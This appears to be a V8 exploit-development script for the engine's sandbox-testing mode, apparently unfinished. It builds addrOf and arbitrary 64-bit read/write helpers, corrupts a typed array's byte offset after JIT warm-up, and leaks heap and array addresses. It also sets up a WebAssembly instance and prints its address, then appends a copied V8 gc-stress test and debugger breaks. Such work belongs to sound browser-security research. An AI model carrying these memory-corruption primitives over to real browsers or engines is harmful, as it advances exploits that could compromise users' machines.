/// r --expose-gc --allow-natives-syntax --sandbox-testing ../../../tests/jsarray_test.js


let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
return Sandbox.getAddressOf(obj);
}

function v8_read64(addr) {
return sandboxMemory.getBigUint64(Number(addr), true);
}

function v8_write64(addr, val) {
return sandboxMemory.setBigInt64(Number(addr), val, true);
}


const gsab = new SharedArrayBuffer(4,{"maxByteLength":0x4242});
const u16arr = new Uint16Array(gsab);

/// for writing
function foo(obj, index, val){
    obj[index] += val; // if val = 0 -> read
    return obj[index];
}

function test(iii, val){
    return foo(u16arr, iii, val);
}

for (let i = 0; i < 0x10000; i++) {
    test(1, 0);
}
let byte_offset_ofs = BigInt(addrOf(u16arr) + 0x17);
v8_write64(byte_offset_ofs+4n, 0x41414141n); // changing byte_offset


// ================= reading heap_base =============================
let ofs1 = 0x48;
let heap_addr = v8_read64(ofs1);
let low_ofs_started_page = heap_addr & 0xffffffffn;
let high_ofs_started_page = heap_addr & 0xffffffff00000000n;
console.log("heap_addr: 0x" + heap_addr.toString(16));

// ================= reading started array address ===============
let started_array = v8_read64(addrOf(u16arr) + 0x2f + 1) >> 0x18n;//
started_array = Number(started_array + high_ofs_started_page);
console.log("started_array: 0x" + started_array.toString(16));
console.log("==================================================================");

/// ===================================================================================
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

let wasm_instance_addr = addrOf(wasm_instance);
console.log("wasm_instance: 0x" + wasm_instance_addr.toString(16));

// %SystemBreak();

for (let i=0; i<10000; i++){
    f();
}
%DebugPrint(f);
console.log("==================================================================");

/// ===================================================================================

// test/mjsunit/wasm/shared-memory-gc-stress.js
function AllocMemory(pages, max = pages) {
    let m =
        new WebAssembly.Memory({initial : pages, maximum : max, shared : true});
    let v = new Int32Array(m.buffer);
    return {memory : m, view : v};
  }
  
  function RunSomeAllocs(total, retained, pages, max = pages) {
    print(`-------iterations = ${total}, retained = ${retained} -------`);
    var array = new Array(retained);
    for (var i = 0; i < total; i++) {
      if ((i % 25) == 0)
        print(`iteration ${i}`);
      let pair = AllocMemory(pages, max);
      // For some iterations, retain the memory, view, or both.
      switch (i % 3) {
      case 0:
        pair.memory = null;
        break;
      case 1:
        pair.view = null;
        break;
      case 2:
        break;
      }
      array[i % retained] = pair;
    }
  }
  
  RunSomeAllocs(10, 1, 1, 1);
  RunSomeAllocs(100, 3, 1, 1);
  RunSomeAllocs(1000, 10, 1, 1);
  // TODO(12278): Make this faster (by collection memories earlier?) and reenable.
  // RunSomeAllocs(10000, 20, 1, 1);
%SystemBreak();